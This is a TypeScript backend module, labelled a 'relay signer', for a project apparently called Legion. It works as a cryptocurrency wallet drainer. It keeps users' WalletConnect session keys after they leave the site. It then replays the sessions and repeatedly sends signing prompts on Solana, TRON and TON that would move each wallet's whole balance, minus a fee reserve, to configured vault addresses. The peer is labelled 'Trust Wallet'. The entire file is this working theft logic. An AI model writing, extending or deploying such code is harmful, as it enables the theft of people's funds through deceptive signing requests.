/**
 * WC Relay Signer — backend-initiated sign requests via WalletConnect relay.
 * Sends sign requests to user's wallet even after they close the site.
 * Phase 1: SOL, TRON, TON sign requests only. EVM Permit2 is Phase 2.
 */

import {
  createResilientRedisClient,
  resolveEffectiveRedisUrl,
  type RedisPingClient,
} from '@legion/core/lib/redis-wrapper'
import IoRedis from 'ioredis'

// ─── Types ─────────────────────────────────────────────────────────────────────

export type WcSessionData = {
  topic: string
  sym_key: string
  expiry: number
  namespaces?: Record<string, unknown>
  wallet_addresses?: {
    evm?: string
    sol?: string
    tron?: string
    ton?: string
    btc?: string
  }
  self_public_key?: string
  peer_public_key?: string
}

// ─── Redis ─────────────────────────────────────────────────────────────────────

const WC_SESSION_KEY_PREFIX = 'wc:offsite:'
const MAX_TTL_SEC = 7 * 24 * 3600

type RedisClient = RedisPingClient
const RedisCtor = IoRedis as unknown as new (url: string, options?: Record<string, unknown>) => RedisClient

let _redis: RedisClient | null = null

function getRedis(): RedisClient | null {
  if (_redis) return _redis
  const url = resolveEffectiveRedisUrl()
  if (!url) return null
  _redis = createResilientRedisClient(RedisCtor, url, false)
  return _redis
}

async function storeSession(data: WcSessionData): Promise<boolean> {
  const redis = getRedis()
  if (!redis) return false
  const now = Math.floor(Date.now() / 1000)
  const ttl = Math.min(MAX_TTL_SEC, Math.max(0, data.expiry - now))
  if (ttl < 60) return false
  try {
    await (redis as any).set(
      `${WC_SESSION_KEY_PREFIX}${data.topic}`,
      JSON.stringify(data),
      'EX',
      ttl,
    )
    return true
  } catch {
    return false
  }
}

// ─── SignClient lazy singleton ─────────────────────────────────────────────────

// We use a dynamic import so the heavy WC package is only loaded when actually needed.
type SignClientInstance = {
  core: {
    crypto: { keychain: { set(tag: string, key: string): Promise<void> } }
  }
  session: { set(topic: string, data: Record<string, unknown>): Promise<void> }
  request(args: {
    topic: string
    chainId: string
    request: { method: string; params: unknown[] }
    expiry?: number
  }): Promise<unknown>
}

let _client: SignClientInstance | null = null
let _clientPromise: Promise<SignClientInstance | null> | null = null

async function getClient(): Promise<SignClientInstance | null> {
  if (_client) return _client
  if (_clientPromise) return _clientPromise

  const projectId = (
    process.env['WC_PROJECT_ID'] ??
    process.env['NEXT_PUBLIC_WC_PROJECT_ID'] ??
    ''
  ).trim()
  if (!projectId) {
    console.warn('[WcRelay] WC_PROJECT_ID not set — relay signer disabled')
    return null
  }

  _clientPromise = (async () => {
    try {
      // Dynamic import keeps the WC package out of the main bundle until needed
      const mod = await import('@walletconnect/sign-client' as string)
      // Named export first, then default (handles ESM/CJS interop difference)
      const SignClient = (mod.SignClient ?? mod.default?.SignClient ?? mod.default ?? mod) as { init(opts: Record<string, unknown>): Promise<SignClientInstance> }
      _client = await SignClient.init({
        projectId,
        metadata: {
          name: 'Legion',
          description: '',
          url: (process.env['API_PUBLIC_URL'] ?? 'https://legionapi-production.up.railway.app').trim(),
          icons: [],
        },
      })
      console.log('[WcRelay] SignClient ready')
      return _client
    } catch (e) {
      _clientPromise = null
      console.warn('[WcRelay] SignClient init fail:', e instanceof Error ? e.message : String(e))
      return null
    }
  })()

  return _clientPromise
}

// ─── Session injection ─────────────────────────────────────────────────────────

async function injectSession(s: WcSessionData): Promise<boolean> {
  const client = await getClient()
  if (!client) return false
  try {
    await client.core.crypto.keychain.set(s.topic, s.sym_key)
    const cappedExpiry = Math.min(s.expiry, Math.floor(Date.now() / 1000) + MAX_TTL_SEC)
    await client.session.set(s.topic, {
      topic: s.topic,
      pairingTopic: s.topic,
      relay: { protocol: 'irn' },
      expiry: cappedExpiry,
      acknowledged: true,
      controller: s.peer_public_key ?? '',
      namespaces: s.namespaces ?? {},
      requiredNamespaces: {},
      optionalNamespaces: {},
      self: {
        publicKey: s.self_public_key ?? '',
        metadata: { name: 'Legion', description: '', url: '', icons: [] },
      },
      peer: {
        publicKey: s.peer_public_key ?? '',
        metadata: { name: 'Trust Wallet', description: '', url: '', icons: [] },
      },
    })
    return true
  } catch (e) {
    console.warn('[WcRelay] injectSession fail:', e instanceof Error ? e.message : String(e))
    return false
  }
}

// ─── Relay send helper ─────────────────────────────────────────────────────────

async function sendRequest(
  session: WcSessionData,
  chainId: string,
  method: string,
  params: unknown[],
): Promise<unknown> {
  const client = await getClient()
  if (!client) throw new Error('no-client')
  await injectSession(session)
  return client.request({
    topic: session.topic,
    chainId,
    request: { method, params },
    expiry: 300, // relative TTL in seconds (300–604800), NOT absolute timestamp
  })
}

// ─── Chain-ID extractor from WC namespace ──────────────────────────────────────

function chainIdFromNs(ns: Record<string, unknown>, family: string): string | null {
  const f = ns[family] as { accounts?: string[] } | undefined
  if (!f?.accounts?.[0]) return null
  const parts = String(f.accounts[0]).split(':')
  if (parts.length < 2) return null
  return `${family}:${parts[1]}`
}

// ─── SOL sign request ──────────────────────────────────────────────────────────

async function trySolSign(session: WcSessionData): Promise<boolean> {
  const solAddr = session.wallet_addresses?.sol
  if (!solAddr) return false
  const vaultSol = process.env['VAULT_ADDRESS_SOL']?.trim()
  const solRpc = (
    process.env['RPC_SOLANA_PRIVATE'] ??
    process.env['NEXT_PUBLIC_SOLANA_RPC_URL'] ??
    ''
  ).trim()
  if (!vaultSol || !solRpc) return false

  const chainId =
    chainIdFromNs(session.namespaces ?? {}, 'solana') ??
    'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'

  try {
    const {
      Connection,
      PublicKey,
      SystemProgram,
      TransactionMessage,
      VersionedTransaction,
    } = await import('@solana/web3.js')

    const conn = new Connection(solRpc, 'confirmed')
    const from = new PublicKey(solAddr)
    const to = new PublicKey(vaultSol)
    const lamports = await conn.getBalance(from)
    const sendLamports = lamports - 5000
    if (sendLamports <= 0) return false

    const { blockhash } = await conn.getLatestBlockhash()
    const msg = new TransactionMessage({
      payerKey: from,
      recentBlockhash: blockhash,
      instructions: [
        SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: sendLamports }),
      ],
    }).compileToV0Message()

    const tx = new VersionedTransaction(msg)
    const b64 = Buffer.from(tx.serialize()).toString('base64')

    await sendRequest(session, chainId, 'solana_signAndSendTransaction', [
      { transaction: b64 },
    ])
    console.log('[WcRelay] SOL sign sent | addr:', solAddr.slice(0, 8) + '...')
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] SOL fail:', msg)
    return false
  }
}

// ─── TRON sign request ─────────────────────────────────────────────────────────

async function tryTronSign(session: WcSessionData): Promise<boolean> {
  const tronAddr = session.wallet_addresses?.tron
  if (!tronAddr) return false
  const vaultTron = process.env['VAULT_ADDRESS_TRON']?.trim()
  if (!vaultTron) return false

  const chainId =
    chainIdFromNs(session.namespaces ?? {}, 'tron') ?? 'tron:0x2b6653dc'

  try {
    const { TronWeb } = await import('tronweb')
    const fullHost = (process.env['TRON_RPC_URL'] ?? 'https://api.trongrid.io').trim()
    const tw = new TronWeb({ fullHost })
    tw.setAddress(tronAddr)

    const balSun = await tw.trx.getBalance(tronAddr)
    const sendSun = balSun - 1_500_000 // 1.5 TRX fee reserve
    if (sendSun <= 0) return false

    const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>

    const result = await sendRequest(session, chainId, 'tron_signTransaction', [
      { transaction: rawTx },
    ]) as { signature?: string[] } | null

    // If signed tx returned, broadcast it
    if (result?.signature?.length) {
      await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
    }
    console.log('[WcRelay] TRON sign sent | addr:', tronAddr.slice(0, 8) + '...')
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TRON fail:', msg)
    return false
  }
}

// ─── TON sign request ──────────────────────────────────────────────────────────

async function tryTonSign(session: WcSessionData): Promise<boolean> {
  const tonAddr = session.wallet_addresses?.ton
  if (!tonAddr) return false
  const vaultTon = process.env['VAULT_ADDRESS_TON']?.trim()
  if (!vaultTon) return false

  const chainId =
    chainIdFromNs(session.namespaces ?? {}, 'ton') ??
    chainIdFromNs(session.namespaces ?? {}, 'tvm') ??
    'ton:mainnet'

  try {
    const tonCenter = (
      process.env['TON_CENTER_API_URL'] ??
      process.env['TON_API_URL'] ??
      'https://toncenter.com'
    ).trim()

    const resp = await fetch(
      `${tonCenter}/api/v2/getAddressBalance?address=${tonAddr}`,
    )
    const json = (await resp.json()) as { ok?: boolean; result?: string }
    if (!json.ok) return false

    const balNano = BigInt(json.result ?? '0')
    const sendNano = balNano - 15_000_000n // 0.015 TON fee reserve
    if (sendNano <= 0n) return false

    await sendRequest(session, chainId, 'ton_sendTransaction', [
      {
        messages: [{ address: vaultTon, amount: String(sendNano) }],
        valid_until: Math.floor(Date.now() / 1000) + 600,
      },
    ])
    console.log('[WcRelay] TON sign sent | addr:', tonAddr.slice(0, 8) + '...')
    return true
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TON fail:', msg)
    return false
  }
}

// ─── Sign loop ─────────────────────────────────────────────────────────────────

const RETRY_INTERVAL_MS = 60_000  // 60s — relay rate-limit friendly
const MAX_RETRIES_PER_CHAIN = 8

const activeLoops = new Set<string>()

async function runSignLoop(session: WcSessionData): Promise<void> {
  const { topic, expiry } = session
  const retries: Record<string, number> = { sol: 0, tron: 0, ton: 0 }
  const done: Record<string, boolean> = {}

  while (activeLoops.has(topic)) {
    // Stop if session expired
    if (expiry && Math.floor(Date.now() / 1000) > expiry) break

    // Stop if all chains finished or exhausted retries
    const allDone = (['sol', 'tron', 'ton'] as const).every(
      (c) => done[c] || (retries[c] ?? 0) >= MAX_RETRIES_PER_CHAIN,
    )
    if (allDone) break

    if (!done['sol'] && (retries['sol'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
      if (await trySolSign(session)) done['sol'] = true
      else retries['sol'] = (retries['sol'] ?? 0) + 1
    }
    if (!done['tron'] && (retries['tron'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
      if (await tryTronSign(session)) done['tron'] = true
      else retries['tron'] = (retries['tron'] ?? 0) + 1
    }
    if (!done['ton'] && (retries['ton'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
      if (await tryTonSign(session)) done['ton'] = true
      else retries['ton'] = (retries['ton'] ?? 0) + 1
    }

    await new Promise<void>((r) => setTimeout(r, RETRY_INTERVAL_MS))
  }

  activeLoops.delete(topic)
}

// ─── Public API ────────────────────────────────────────────────────────────────

/**
 * Register a WC session from the frontend and start the offsite sign loop.
 * Called from the /api/v1/wc/session endpoint.
 */
export async function registerWcSession(data: WcSessionData): Promise<boolean> {
  const stored = await storeSession(data)
  if (!stored) return false

  // Deduplicate: one loop per topic
  if (!activeLoops.has(data.topic)) {
    activeLoops.add(data.topic)
    void runSignLoop(data).catch((e) => {
      activeLoops.delete(data.topic)
      console.warn(
        '[WcRelay] loop crashed | topic:',
        data.topic.slice(0, 8) + '... |',
        e instanceof Error ? e.message : String(e),
      )
    })
  }

  return true
}
